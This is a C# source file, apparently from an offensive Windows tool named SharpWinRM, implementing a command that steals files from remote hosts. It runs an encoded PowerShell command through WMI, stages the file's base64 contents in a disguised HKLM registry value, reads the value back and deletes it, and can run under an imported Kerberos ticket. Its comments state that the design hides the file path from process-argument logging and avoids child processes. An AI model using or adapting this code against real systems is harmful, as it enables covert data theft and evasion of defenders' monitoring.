using System;
using System.IO;
using System.Text;

namespace SharpWinRM.Commands
{
    internal class Download
    {
        internal static void Run(ArgumentParser args, WinRmContext ctx)
        {
            string remote = args.Get("remote");
            string local  = args.Get("local");

            if (string.IsNullOrEmpty(remote)) { Helpers.PrintError("Missing /remote:"); return; }

            // If /local is omitted, save to current directory using the remote filename.
            // If /local is a directory (existing or trailing slash), append the remote filename.
            string remoteFile = Path.GetFileName(remote.TrimEnd('\\', '/'));
            if (string.IsNullOrEmpty(local))
                local = remoteFile;
            else if (Directory.Exists(local) || local.EndsWith("\\") || local.EndsWith("/") || string.IsNullOrEmpty(Path.GetExtension(local)))
                local = Path.Combine(local.TrimEnd('\\', '/'), remoteFile);

            Helpers.PrintInfo("Target  : " + ctx.Url);
            Helpers.PrintInfo("Auth    : " + ctx.Auth);
            Helpers.PrintInfo("Remote  : " + remote);
            Helpers.PrintInfo("Local   : " + local);
            Console.WriteLine();

            try
            {
                if (ctx.Auth == AuthMode.Ticket)
                {
                    Helpers.PrintInfo("Creating isolated logon session...");
                    using (KerberosTicket.CreateAndImport(ctx.Ticket))
                    {
                        Helpers.PrintSuccess("Ticket loaded (isolated session — your session is untouched).");
                        Console.WriteLine();
                        DoDownload(ctx, remote, local);
                    }
                }
                else
                {
                    DoDownload(ctx, remote, local);
                }
            }
            catch (Exception ex)
            {
                Helpers.PrintError("Download failed: " + ex.Message);
            }
        }

        private static void DoDownload(WinRmContext ctx, string remote, string local)
        {
            // ── How this works ────────────────────────────────────────────────────
            //
            // Step 1 — Win32_Process.Create:
            //   Spawns a brief powershell.exe (parent: wmiprvse.exe) with a
            //   -EncodedCommand that base64-encodes the remote file and writes
            //   the result to a staging registry value in HKLM.
            //   File path is NOT in plain-text process args.
            //
            // Step 2 — StdRegProv.GetStringValue (poll):
            //   Reads the staged base64 data. No child process — pure wmiprvse.exe.
            //
            // Step 3 — StdRegProv.DeleteValue:
            //   Removes the staging value. No child process.
            //
            // Remote process tree:
            //   svchost (WinMgmt) → wmiprvse.exe → powershell.exe  (brief, step 1 only)
            //   Steps 2 and 3: wmiprvse.exe only (no child process).
            // ─────────────────────────────────────────────────────────────────────

            const string stagingKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Diagnostics";
            string stagingValue = "Cfg" + Guid.NewGuid().ToString("N").Substring(0, 10);

            // PS command: base64-encode the file and write to HKLM staging value.
            // Uses CreateSubKey so the Diagnostics key is created if it doesn't exist.
            // Passed as -EncodedCommand (UTF-16LE) so file path is not plain-text in args.
            string psScript =
                "[Microsoft.Win32.Registry]::LocalMachine" +
                ".CreateSubKey('" + stagingKey + "')" +
                ".SetValue('" + stagingValue + "'," +
                "[Convert]::ToBase64String([IO.File]::ReadAllBytes('" + remote + "')))";

            string encodedCmd = Convert.ToBase64String(Encoding.Unicode.GetBytes(psScript));

            using (var client = WsManClient.Create(ctx))
            {
                // Step 1: Invoke Win32_Process.Create via WMI
                Helpers.PrintInfo("Invoking Win32_Process.Create via WMI...");
                int pid = client.WmiCreateProcess(
                    "powershell.exe -NoProfile -NonInteractive -EncodedCommand " + encodedCmd);
                Helpers.PrintInfo("Process spawned (PID " + pid + ") — polling for staged data...");

                // Step 2: Poll for staged data (no child process — pure wmiprvse.exe)
                string b64 = null;
                for (int i = 0; i < 60; i++)
                {
                    System.Threading.Thread.Sleep(1000);
                    b64 = client.WmiRegGetString(stagingKey, stagingValue);
                    if (b64 != null) break;
                }

                // Step 3: Clean up staging value regardless of outcome
                try { client.WmiRegDeleteValue(stagingKey, stagingValue); } catch { }

                if (b64 == null)
                    throw new Exception("Timed out (60s) waiting for staged data. Verify path and permissions.");

                byte[] data = Convert.FromBase64String(b64.Trim());

                string dir = Path.GetDirectoryName(Path.GetFullPath(local));
                if (!string.IsNullOrEmpty(dir))
                    Directory.CreateDirectory(dir);

                File.WriteAllBytes(local, data);
                Helpers.PrintSuccess("Downloaded " + data.Length + " bytes → " + local);
            }
        }
    }
}
